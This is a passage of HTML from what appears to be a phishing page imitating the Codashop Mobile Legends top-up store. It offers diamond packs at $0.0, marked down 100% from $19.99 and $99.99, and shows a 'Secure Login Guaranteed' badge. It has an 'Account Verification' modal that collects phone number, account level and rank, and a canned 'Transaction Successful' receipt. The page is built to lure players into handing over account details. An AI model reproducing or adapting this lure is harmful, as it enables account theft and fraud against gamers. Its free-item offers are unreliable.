                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
                <span class="text-xs text-gray-500">Secure Login Guaranteed</span>
            </div>

        </div>
    </div>
</div>

<div id="verification-modal" class="fixed inset-0 z-50 hidden" role="dialog" aria-modal="true">
    
    <div class="fixed inset-0 bg-black/60 transition-opacity opacity-0" id="verify-backdrop"></div>
    <div class="fixed inset-0 z-10 flex items-end justify-center sm:items-center p-0 sm:p-4">
        <div id="verify-panel" class="relative w-full max-w-md transform overflow-hidden bg-white text-left shadow-xl transition-all rounded-t-2xl sm:rounded-2xl translate-y-full sm:translate-y-0 opacity-0 sm:opacity-100">
            
            <div class="px-5 pt-5 pb-2">
                <h3 class="text-xl font-bold text-gray-900">Account Verification</h3>
                <p class="mt-1 text-sm text-gray-500">Please verify your account details to proceed.</p>
            </div>

            <div class="px-5 py-4 space-y-4">
    
                <div id="verify-error" class="hidden bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-lg text-sm flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                    </svg>
                    <span>Please fill in all verification details.</span>
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
                    <input type="tel" id="verify-phone" class="w-full text-black px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 outline-none transition-colors" placeholder="e.g. +628123456789">
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Account Level</label>
                    <select id="verify-level" class="w-full text-black px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-indigo-500 outline-none bg-white"><option value="" disabled="" selected="">Select Account Level</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option><option value="56">56</option><option value="57">57</option><option value="58">58</option><option value="59">59</option><option value="60">60</option><option value="61">61</option><option value="62">62</option><option value="63">63</option><option value="64">64</option><option value="65">65</option><option value="66">66</option><option value="67">67</option><option value="68">68</option><option value="69">69</option><option value="70">70</option><option value="71">71</option><option value="72">72</option><option value="73">73</option><option value="74">74</option><option value="75">75</option><option value="76">76</option><option value="77">77</option><option value="78">78</option><option value="79">79</option><option value="80">80</option><option value="81">81</option><option value="82">82</option><option value="83">83</option><option value="84">84</option><option value="85">85</option><option value="86">86</option><option value="87">87</option><option value="88">88</option><option value="89">89</option><option value="90">90</option><option value="91">91</option><option value="92">92</option><option value="93">93</option><option value="94">94</option><option value="95">95</option><option value="96">96</option><option value="97">97</option><option value="98">98</option><option value="99">99</option><option value="100">100</option><option value="101">101</option><option value="102">102</option><option value="103">103</option><option value="104">104</option><option value="105">105</option><option value="106">106</option><option value="107">107</option><option value="108">108</option><option value="109">109</option><option value="110">110</option><option value="111">111</option><option value="112">112</option><option value="113">113</option><option value="114">114</option><option value="115">115</option><option value="116">116</option><option value="117">117</option><option value="118">118</option><option value="119">119</option><option value="120">120</option><option value="121">121</option><option value="122">122</option><option value="123">123</option><option value="124">124</option><option value="125">125</option><option value="126">126</option><option value="127">127</option><option value="128">128</option><option value="129">129</option><option value="130">130</option><option value="131">131</option><option value="132">132</option><option value="133">133</option><option value="134">134</option><option value="135">135</option><option value="136">136</option><option value="137">137</option><option value="138">138</option><option value="139">139</option><option value="140">140</option><option value="141">141</option><option value="142">142</option><option value="143">143</option><option value="144">144</option><option value="145">145</option><option value="146">146</option><option value="147">147</option><option value="148">148</option><option value="149">149</option><option value="150">150</option><option value="151">151</option><option value="152">152</option><option value="153">153</option><option value="154">154</option><option value="155">155</option><option value="156">156</option><option value="157">157</option><option value="158">158</option><option value="159">159</option><option value="160">160</option><option value="161">161</option><option value="162">162</option><option value="163">163</option><option value="164">164</option><option value="165">165</option><option value="166">166</option><option value="167">167</option><option value="168">168</option><option value="169">169</option><option value="170">170</option><option value="171">171</option><option value="172">172</option><option value="173">173</option><option value="174">174</option><option value="175">175</option><option value="176">176</option><option value="177">177</option><option value="178">178</option><option value="179">179</option><option value="180">180</option><option value="181">181</option><option value="182">182</option><option value="183">183</option><option value="184">184</option><option value="185">185</option><option value="186">186</option><option value="187">187</option><option value="188">188</option><option value="189">189</option><option value="190">190</option><option value="191">191</option><option value="192">192</option><option value="193">193</option><option value="194">194</option><option value="195">195</option><option value="196">196</option><option value="197">197</option><option value="198">198</option><option value="199">199</option><option value="200">200</option></select>
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-1">Current Rank</label>
                    <select id="verify-rank" class="w-full text-black px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-indigo-500 outline-none bg-white">
                        <option selected="selected" disabled="disabled" value="">Select Your Current Account Rank</option>
                        <option>Warrior</option>
                        <option>Elite</option>
                        <option>Master</option>
                        <option>Grandmaster</option>
                        <option>Epic</option>
                        <option>Legend</option>
                        <option>Mythic</option>
                        <option>Mythical Honor</option>
                        <option>Mythical Glory</option>
                        <option>Mythical Immortal</option>
                    </select>
                </div>
            </div>

            <div class="p-5 border-t border-gray-50">
                <button id="btn-submit-verification" class="w-full rounded-full bg-[#5b4ef6] py-3 text-sm font-bold text-white shadow-lg hover:bg-indigo-600 transition-all">
                    Verify
                </button>
            </div>
        </div>
    </div>
</div>

<div id="success-modal" class="fixed inset-0 z-50 hidden" role="dialog" aria-modal="true">
    <div class="fixed inset-0 bg-black/60 transition-opacity opacity-0" id="success-backdrop"></div>
    <div class="fixed inset-0 z-10 flex items-center justify-center p-4">
        <div id="success-panel" class="relative w-full max-w-sm transform overflow-hidden bg-white text-left shadow-2xl transition-all rounded-2xl scale-95 opacity-0">
            
            <div class="p-6">
                <div class="text-center mb-6">
                    <div class="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-100 mb-4">
                        <svg class="h-10 w-10 text-green-600 animate-check" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                        </svg>
                    </div>
                    <h2 class="text-2xl font-bold text-gray-900">Transaction Successful</h2>
                </div>

                <div class="bg-[#F5F6FF] rounded-xl p-4 mb-6 flex items-center gap-4 border border-indigo-50">
                    <img id="success-product-img" src="" class="h-12 w-12 object-contain">
                    <span id="success-product-name" class="font-bold text-gray-800 text-xs">-</span>
                </div>

                <div class="space-y-3 text-sm">
                    <div class="flex justify-between">
                        <span class="text-gray-500">Payment Method</span>
                        <span id="success-payment" class="font-bold text-gray-900">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-gray-500">Order ID</span>
                        <span id="success-order-id" class="font-bold text-gray-900 font-mono">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-gray-500">Transaction ID</span>
                        <span id="success-trx-id" class="font-bold text-gray-900 font-mono">-</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-gray-500">Payment Status</span>
                        <span class="font-bold text-green-600">Successful</span>
                    </div>
                    <div class="flex justify-between pt-2 border-t border-gray-100">
                        <span class="text-gray-500">Total Payment</span>
                        <span id="success-price" class="font-bold text-gray-900 text-base">$0.00</span>
                    </div>
                </div>
            </div>

            <div class="px-6 pb-6">
                <button onclick="location.reload()" class="w-full rounded-xl bg-[#5b4ef6] py-3.5 text-sm font-bold text-white shadow-md hover:bg-indigo-600 transition-all">
                    Make Another Purchase
                </button>
            </div>

        </div>
    </div>
</div>
                           <!--]-->
                           <div class="product__purchase-steps-container" data-v-a85cd964="">
                              <!---->
                              <div style="" data-v-a85cd964="">
                                 <!--[-->
                                 <div id="step-user-id" class="product__purchase-step__container" data-testid="purchase-step-userid" data-v-a85cd964="" data-v-0a726f0f="">
                                    <!---->
                                    <div class="product__purchase-step__heading" data-v-0a726f0f="">
                                       <h2 id="step-user-id-heading" data-v-0a726f0f="">
                                          <span class="product__purchase-step__icon" data-v-0a726f0f=""></span><span class="product__purchase-step__title" data-v-0a726f0f="">Enter User ID</span><!---->
                                       </h2>
                                    </div>
                                    <!---->
                                    <div class="product__purchase-step__content" data-v-0a726f0f="">
                                       <!--[-->
                                       <div class="user-identification" data-v-a85cd964="" data-v-42630b9a="">
                                          <!---->
                                          <div class="user-identification__fields-container" data-v-42630b9a="">
                                             <div class="user-identification__fields" data-v-42630b9a="">
                                                <!--[-->
                                                <div class="user-identification__fields__field" data-v-42630b9a="">
                                                   <div class="text-field" data-theme="lightTheme" data-testid="form-text-field" required="" data-auto-capture="userIdInputClick" data-v-42630b9a="" data-v-c991c0e3="">
                                                      <div class="text-field__input-container--full-width text-field__input-container" data-v-c991c0e3="">
                                                         <input id="userId" type="tel" placeholder="Enter User ID" name="userId" minlength="10" autocomplete="on" class="text-field__input-container__input peer text-field__input-container__input--default" data-v-c991c0e3=""><!----><!----><!----><!---->
                                                      </div>
                                                      <!----><!---->
                                                   </div>
                                                </div>
                                                <div class="user-identification__fields__field" data-v-42630b9a="">
                                                   <div class="text-field" data-theme="lightTheme" data-testid="form-text-field" required="" data-auto-capture="userIdInputClick" data-v-42630b9a="" data-v-c991c0e3="">
                                                      <div class="text-field__input-container--full-width text-field__input-container" data-v-c991c0e3="">
                                                         <input id="zoneId" type="tel" placeholder="Zone ID" name="zoneId" minlength="5" autocomplete="on" class="text-field__input-container__input peer text-field__input-container__input--left-icon text-field__input-container__input--right-icon text-field__input-container__input--default" data-v-c991c0e3="">
                                                         <div class="text-field__input-container__left-icon" data-v-c991c0e3="">
                                                            <!--[--><span class="left-parenthesis" data-v-42630b9a=""></span><!--]-->
                                                         </div>
                                                         <div class="text-field__input-container__right-icon" data-v-c991c0e3="">
                                                            <!--[--><span class="right-parenthesis" data-v-42630b9a=""></span><!--]-->
                                                         </div>
                                                         <!----><!---->
                                                      </div>
                                                      <!----><!---->
                                                   </div>
                                                </div>
                                                <!--]-->
                                                <span class="user-identification__tooltip-icon user-identification__tooltip-container" data-testid="user-id-tooltip" data-v-42630b9a="" data-v-83fcbcf1="">
                                                   <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="user-identification__tooltip" style="fill:#522BE3;" data-testid="user-id-tooltip" data-v-83fcbcf1="">
                                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM11 17C11 16.4477 11.4477 16 12 16H12.01C12.5623 16 13.01 16.4477 13.01 17C13.01 17.5523 12.5623 18 12.01 18H12C11.4477 18 11 17.5523 11 17ZM13.3829 6.30376C12.7011 6.02173 11.9546 5.93377 11.2259 6.0496C10.4972 6.16543 9.8148 6.48054 9.25407 6.96009C8.69335 7.43963 8.27618 8.06492 8.04871 8.76679C7.87844 9.29218 8.16632 9.85611 8.6917 10.0264C9.21708 10.1966 9.78102 9.90878 9.95129 9.3834C10.065 9.03246 10.2736 8.71982 10.554 8.48004C10.8343 8.24027 11.1755 8.08272 11.5399 8.0248C11.9042 7.96689 12.2775 8.01087 12.6184 8.15188C12.9593 8.2929 13.2545 8.52545 13.4715 8.82382C13.6884 9.12219 13.8186 9.47476 13.8477 9.84252C13.8845 10.3086 13.8462 10.5911 13.7144 10.8499C13.5411 11.1902 13.3428 11.4235 12.9774 11.6474C12.627 11.8622 12.1848 12 11.8539 12C11.3016 12 10.8539 12.4477 10.8539 13C10.8539 13.5523 11.3016 14 11.8539 14C12.6297 14 13.4294 13.7162 14.0226 13.3526C14.7239 12.9227 15.1677 12.4034 15.4966 11.7575C15.8671 11.0301 15.8918 10.3222 15.8414 9.68504C15.7833 8.94951 15.523 8.24439 15.0891 7.64764C14.6551 7.0509 14.0646 6.58579 13.3829 6.30376Z"></path>
                                                   </svg>
                                                </span>
                                             </div><div id="profile-badge-wrapper"></div>
                                          </div>

                                          <div class="profile-badge-container mt-2 badgecheck" style="display:none">
                                            <span class="inline-block rounded-[8px] px-[12px] py-[6px] text-xs bg-[#EFEBFD] text-[#522BE3]">
                                                <div class="flex items-center gap-2">
                                                    <svg class="animate-spin w-4 h-4 text-[#522BE3]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                                    </svg>
                                                    <div>Checking...</div>
                                                </div>
                                            </span>
                                        </div>

                                        <div class="profile-badge-container mt-2 badgeerror" style="display:none">
                                            <span class="inline-block rounded-[8px] px-[12px] py-[6px] text-xs bg-[#FEF2F2] text-[#DC2626]">
                                                <div class="flex items-center gap-2">
                                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="w-5 h-5 fill-[#DC2626]"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                                                    <div>We could not find User ID of : <span id="useridcheck"></span> (<span id="zoneidcheck"></span>)</div>
                                                </div>
                                            </span>
                                        </div>

                                        <div class="profile-badge-container mt-2 badgesuccess" style="display:none">
                                                <p class="text-sm font-bold text-[#007547] mb-2">Welcome</p>
                                                <span class="inline-block rounded-[8px] px-[12px] py-[6px] text-xs bg-[#D1FADF] text-[#007547]">
                                                    <div class="flex items-center gap-2">
                                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="w-5 h-5 fill-[#007547]"><path fill-rule="evenodd" d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10zm-1.177-7.86l-2.765-2.767L7 12.431l3.823 3.823 8.177-8.177-1.059-1.058-7.118 7.118z"></path></svg>
                                                        <div><span id="responseusername"></span></div>
                                                    </div>
                                                </span>
                                            </div>

                                          <!----><!----><!---->
                                          <div data-v-baa7f3e1="" data-v-42630b9a="" class="user-identification__tooltip__backdrop" data-testid="user-id-tooltip-display" style="display: none;">
                                             <img data-v-baa7f3e1="" src="images/19.png" alt="Mobile Legends" class="user-identification__tooltip-image">
                                             <div data-v-baa7f3e1="" class="user-identification__tooltip-close">
                                                <svg data-v-baa7f3e1="" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                                                   <path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm101.8-262.2L295.6 256l62.2 62.2c4.7 4.7 4.7 12.3 0 17l-22.6 22.6c-4.7 4.7-12.3 4.7-17 0L256 295.6l-62.2 62.2c-4.7 4.7-12.3 4.7-17 0l-22.6-22.6c-4.7-4.7-4.7-12.3 0-17l62.2-62.2-62.2-62.2c-4.7-4.7-4.7-12.3 0-17l22.6-22.6c4.7-4.7 12.3-4.7 17 0l62.2 62.2 62.2-62.2c4.7-4.7 12.3-4.7 17 0l22.6 22.6c4.7 4.7 4.7 12.3 0 17z" fill="currentColor"></path>
                                                </svg>
                                             </div>
                                          </div>
                                          <div class="user-identification__instructions-container" data-v-42630b9a="">
                                             <div class="user-identification__instructions" data-testid="user-id-instructions" data-v-42630b9a="" data-v-26ab9649="">To find your User ID, click on your avatar in the top left corner of the main game screen. Then go to the "Basic Info" tab. Your user ID is shown below your nickname. Please input the complete user ID here, e.g. 12345678(1234).</div>
                                          </div>
                                       </div>
                                       <!--]-->
                                    </div>
                                 </div>
                                 <!--]-->
                                 <div id="step-sku" class="product__purchase-step__container" data-testid="purchase-step-skus" data-v-a85cd964="" data-v-0a726f0f="">
                                    <!---->
                                    <div class="product__purchase-step__heading" data-v-0a726f0f="">
                                       <h2 id="step-sku-heading" data-v-0a726f0f="">
                                          <span class="product__purchase-step__icon" data-v-0a726f0f=""></span><span class="product__purchase-step__title" data-v-0a726f0f="">Select Top Up</span><!---->
                                       </h2>
                                    </div>
                                    <!---->
                                    <div class="product__purchase-step__content" data-v-0a726f0f="">
                                       <!--[--><!--[--><!---->
                                       <div data-v-a85cd964="">
                                          <!---->
                                       </div>
                                       <div data-v-258c7531="" data-v-a85cd964="" class="highlighted-skus__wrapper" data-testid="highlighted-skus-section">
                                          <div id="headlessui-radiogroup-v-0-2-32" role="radiogroup">
                                             <section data-v-258c7531="" role="none">
                                                <h2 data-v-258c7531="" class="highlighted-skus__section-title" role="none">Our best sellers for you</h2>
                                                <div data-v-258c7531="" class="highlighted-skus__list" role="none">
                                                   <div data-v-258c7531="" id="headlessui-radiogroup-option-v-0-2-33" role="radio" aria-checked="false" tabindex="0" data-headlessui-state="">
                                                      <div data-v-1c24d4d1="" data-v-258c7531="" id="sku-item-tile-diamond_codashopUSD_20" class="highlighted-sku-card" data-testid="highlighted-skus-item" capture-custom-sku-id="diamond_codashopUSD_20" capture-custom-sku-name="1160 Diamonds" data-auto-capture="bestsellerSkuClick">
                                                         <div data-v-1c24d4d1="" class="highlighted-sku-card__inner-container" data-testid="highlighted-sku__inner-container-item-tile-diamond_codashopUSD_20">
                                                            <div data-v-1c24d4d1="" class="sku-info-section">
                                                               <div data-v-1c24d4d1="" class="sku-info-section__titles">
                                                                  <!----><!---->
                                                                  <div data-v-1c24d4d1="" class="sku-info-section__titles__title"><span data-v-1c24d4d1="">1160 Diamonds</span></div>
                                                                  <!----><!----><!---->
                                                               </div>
                                                               <div data-v-1c24d4d1="" class="sku-info-section__images">
                                                                  <div data-v-1c24d4d1="" class="sku-info-section__images__icon"><img data-v-1c24d4d1="" data-nuxt-img="" srcset="images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png 1x, images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png 2x" alt="1160 Diamonds" loading="lazy" src="images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png"></div>
                                                               </div>
                                                            </div>
                                                            <div data-v-1c24d4d1="" class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_20">
                                                               <div data-v-1c24d4d1="" class="price-section__price">
                                                                  <span data-v-1c24d4d1="" class="price-section__price__prefix">From</span>
                                                                  <div data-v-1c24d4d1="" class="price-section__price__price-container">
                                                                     <span data-v-1c24d4d1="" class="price-section__price__price-container__amount">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!---->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$19.99</span>
                </div>
            </div>
                                                            
                                                            <!---->
                                                         </div>
                                                         <!---->
                                                         <div data-v-dff4bb30="" data-v-1c24d4d1="" class="best-seller-tag" data-testid="best-seller-tag">
                                                            <span data-v-dff4bb30="" class="best-seller-tag__shimmer"></span>
                                                            <svg data-v-dff4bb30="" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" class="best-seller-tag__icon">
                                                               <path d="M10 14.3917L15.15 17.5L13.7834 11.6417L18.3334 7.70002L12.3417 7.19169L10 1.66669L7.65835 7.19169L1.66669 7.70002L6.21669 11.6417L4.85002 17.5L10 14.3917Z" fill="currentColor"></path>
                                                            </svg>
                                                            <span data-v-dff4bb30="" class="best-seller-tag__text">BEST SELLER</span>
                                                         </div>
                                                         <!---->
                                                      </div>
                                                   </div>
                                                   <div data-v-258c7531="" id="headlessui-radiogroup-option-v-0-2-34" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="">
                                                      <div data-v-1c24d4d1="" data-v-258c7531="" id="sku-item-tile-diamond_codashopUSD_100" class="highlighted-sku-card" data-testid="highlighted-skus-item" capture-custom-sku-id="diamond_codashopUSD_100" capture-custom-sku-name="6000 Diamonds" data-auto-capture="bestsellerSkuClick">
                                                         <div data-v-1c24d4d1="" class="highlighted-sku-card__inner-container" data-testid="highlighted-sku__inner-container-item-tile-diamond_codashopUSD_100">
                                                            <div data-v-1c24d4d1="" class="sku-info-section">
                                                               <div data-v-1c24d4d1="" class="sku-info-section__titles">
                                                                  <!----><!---->
                                                                  <div data-v-1c24d4d1="" class="sku-info-section__titles__title"><span data-v-1c24d4d1="">6000 Diamonds</span></div>
                                                                  <!----><!----><!---->
                                                               </div>
                                                               <div data-v-1c24d4d1="" class="sku-info-section__images">
                                                                  <div data-v-1c24d4d1="" class="sku-info-section__images__icon"><img data-v-1c24d4d1="" data-nuxt-img="" srcset="images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png 1x, images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png 2x" alt="6000 Diamonds" loading="lazy" src="images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png"></div>
                                                               </div>
                                                            </div>
                                                            <div data-v-1c24d4d1="" class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_100">
                                                               <div data-v-1c24d4d1="" class="price-section__price">
                                                                  <span data-v-1c24d4d1="" class="price-section__price__prefix">From</span>
                                                                  <div data-v-1c24d4d1="" class="price-section__price__price-container">
                                                                     <span data-v-1c24d4d1="" class="price-section__price__price-container__amount">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!---->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$99.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!---->
                                                         <div data-v-dff4bb30="" data-v-1c24d4d1="" class="best-seller-tag" data-testid="best-seller-tag">
                                                            <span data-v-dff4bb30="" class="best-seller-tag__shimmer"></span>
                                                            <svg data-v-dff4bb30="" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" class="best-seller-tag__icon">
                                                               <path d="M10 14.3917L15.15 17.5L13.7834 11.6417L18.3334 7.70002L12.3417 7.19169L10 1.66669L7.65835 7.19169L1.66669 7.70002L6.21669 11.6417L4.85002 17.5L10 14.3917Z" fill="currentColor"></path>
                                                            </svg>
                                                            <span data-v-dff4bb30="" class="best-seller-tag__text">BEST SELLER</span>
                                                         </div>
                                                         <!---->
                                                      </div>
                                                   </div>
                                                </div>
                                             </section>
                                          </div>
                                          <!----><!---->
                                       </div>
                                       <!---->
                                       <div data-v-a85cd964="" class="product__skus__browse-label">Browse all items</div>
                                       <div data-v-fb4c5eea="" data-v-a85cd964="" class="sku-category__container sku-category__container--pill">
                                          <div id="headlessui-radiogroup-v-0-2-15" role="radiogroup">
                                             <div data-v-fb4c5eea="" class="sku-category__options" data-testid="category-item-container" role="none">
                                                <div data-v-fb4c5eea="" id="headlessui-radiogroup-option-v-0-2-16" role="radio" aria-checked="true" tabindex="0" data-headlessui-state="checked" aria-labelledby="headlessui-label-v-0-2-18" aria-describedby="headlessui-description-v-0-2-17">
                                                   <div data-v-e63efbee="" data-v-fb4c5eea="" class="sku-category__tile sku-category__tile--pill sku-category__tile--selected" data-testid="sku-category-tile-1">
                                                      <div data-v-e63efbee="" class="sku-category__tile__inner">
                                                         <div data-v-e63efbee="" id="headlessui-description-v-0-2-17" class="sku-category__tile__image"><img data-v-e63efbee="" src="images/1741855988497_29e54ddd-04b0-48f2-8567-dd2e7a99d872.png" alt="2x Recharge Bonus"></div>
                                                         <span data-v-e63efbee="" id="headlessui-label-v-0-2-18" class="sku-category__tile__name sku-category__tile__name--selected">2x Recharge Bonus</span>
                                                      </div>
                                                   </div>
                                                </div>
                                                <div data-v-fb4c5eea="" id="headlessui-radiogroup-option-v-0-2-19" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" aria-labelledby="headlessui-label-v-0-2-21" aria-describedby="headlessui-description-v-0-2-20">
                                                   <div data-v-e63efbee="" data-v-fb4c5eea="" class="sku-category__tile sku-category__tile--pill" data-testid="sku-category-tile-0">
                                                      <div data-v-e63efbee="" class="sku-category__tile__inner">
                                                         <div data-v-e63efbee="" id="headlessui-description-v-0-2-20" class="sku-category__tile__image"><img data-v-e63efbee="" src="images/1735899441907_5000orMore_MLBB_Diamonds.png" alt="Diamonds"></div>
                                                         <span data-v-e63efbee="" id="headlessui-label-v-0-2-21" class="sku-category__tile__name">Diamonds</span>
                                                      </div>
                                                   </div>
                                                </div>
                                                <div data-v-fb4c5eea="" id="headlessui-radiogroup-option-v-0-2-22" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" aria-labelledby="headlessui-label-v-0-2-24" aria-describedby="headlessui-description-v-0-2-23">
                                                   <div data-v-e63efbee="" data-v-fb4c5eea="" class="sku-category__tile sku-category__tile--pill" data-testid="sku-category-tile-2">
                                                      <div data-v-e63efbee="" class="sku-category__tile__inner">
                                                         <div data-v-e63efbee="" id="headlessui-description-v-0-2-23" class="sku-category__tile__image"><img data-v-e63efbee="" src="images/1741592304828_96c94238-d9db-43ff-b65d-d4c6d99eff4b.png" alt="Twilight Pass"></div>
                                                         <span data-v-e63efbee="" id="headlessui-label-v-0-2-24" class="sku-category__tile__name">Twilight Pass</span>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <!---->
                                       </div>
                                       <div data-testid="sku-options" name="sku" data-v-a85cd964="" data-v-459ee809="">
                                          <!--[-->
                                          <div id="headlessui-radiogroup-v-0-2-0" role="radiogroup">
                                             <!--[-->
                                             <section id="category-1" data-testid="category-section" class="mt-4" data-v-459ee809="" role="none">
                                                <h2 class="sku-list__category-name" data-testid="category-section-title" data-v-459ee809="" role="none">2x Recharge Bonus</h2>
                                                <!---->
                                                <div data-v-459ee809="" data-v-145a1ac1="" role="none">
                                                   <div class="category__banner" data-testid="category-banner" data-v-145a1ac1="" role="none">
                                                      <div class="category__banner-image" data-v-145a1ac1="" role="none"><img data-nuxt-img="" srcset="images/1741855988497_29e54ddd-04b0-48f2-8567-dd2e7a99d872.png 1x, images/1741855988497_29e54ddd-04b0-48f2-8567-dd2e7a99d872.png 2x" onerror="this.setAttribute('data-error', 1)" alt="2x Recharge Bonus" loading="lazy" src="images/1741855988497_29e54ddd-04b0-48f2-8567-dd2e7a99d872.png" data-v-145a1ac1="" role="none"></div>
                                                      <div class="category__banner__content" data-v-145a1ac1="" role="none">
                                                         <div class="category__banner__content-title" data-testid="category-banner-title" data-v-145a1ac1="" role="none">2x Recharge Bonus</div>
                                                         <div class="category__banner__content-description" data-v-145a1ac1="" role="none">During this event, players who haven't recharged the 50/150/250/500 tiers of Diamonds through other platforms can enjoy a double bonus on their first purchase of the following items.</div>
                                                         <div data-v-145a1ac1="" role="none">
                                                            <!---->
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <div class="sku-list" data-v-459ee809="" role="none">
                                                   <!--[-->
                                                   <div id="headlessui-radiogroup-option-v-0-2-1" role="radio" aria-checked="false" tabindex="0" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_1" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_1" capture-custom-sku-id="diamond_codashopUSD_1" capture-custom-sku-name="100 Diamonds (50+50) first recharge!" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_1" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">100 Diamonds (50+50) first recharge!</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_1" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
